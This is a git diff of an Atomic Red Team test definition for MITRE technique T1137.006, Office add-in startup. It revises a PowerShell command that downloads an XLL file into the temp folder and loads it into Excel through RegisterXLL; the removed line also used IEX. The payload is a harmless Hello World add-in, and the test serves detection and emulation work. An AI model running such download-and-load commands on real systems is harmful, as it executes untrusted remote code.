@@ -1,12 +1,16 @@
 attack_technique: T1137.006
 display_name: 'Office Application Startup: Add-ins'
 atomic_tests:
-- name: Code Executed Via Excel Add-in File (Xll)
+- name: Code Executed Via Excel Add-in File (XLL)
   auto_generated_guid: 441b1a0f-a771-428a-8af0-e99e4698cda3
   description: |
     Downloads a XLL file and loads it using the excel add-ins library.
-    This causes excel to display the message "Hello World"
-    Source of XLL - https://github.com/edparcell/HelloWorldXll 
+    This causes excel to display the message "Hello World". This does not include persistent code execution.
+    
+    The provided XLL is for 64-bit versions of Excel only. If you are using a 32-bit version this will fail and "False" will
+    be printed to the screen.
+    
+    [Source of XLL](https://github.com/edparcell/HelloWorldXll) 
   supported_platforms:
     - windows
   input_arguments:
@@ -17,9 +21,8 @@ atomic_tests:
     local_file:
       description: name of the xll file 
       type: Path
-      default: '$env:tmp\HelloWorldXll.xll'
+      default: $env:tmp\HelloWorldXll.xll
   executor:
-    name: powershell
-    elevation_required: true 
+    name: powershell 
     command: |
-      powershell -c "iwr -URI '#{xll_url}' -o '#{local_file}'; IEX ((new-object -ComObject excel.application).RegisterXLL('$env:tmp\HelloWorldXll.xll'))"
+      iwr -URI '#{xll_url}' -o "#{local_file}"; (new-object -ComObject excel.application).RegisterXLL("$env:tmp\HelloWorldXll.xll")
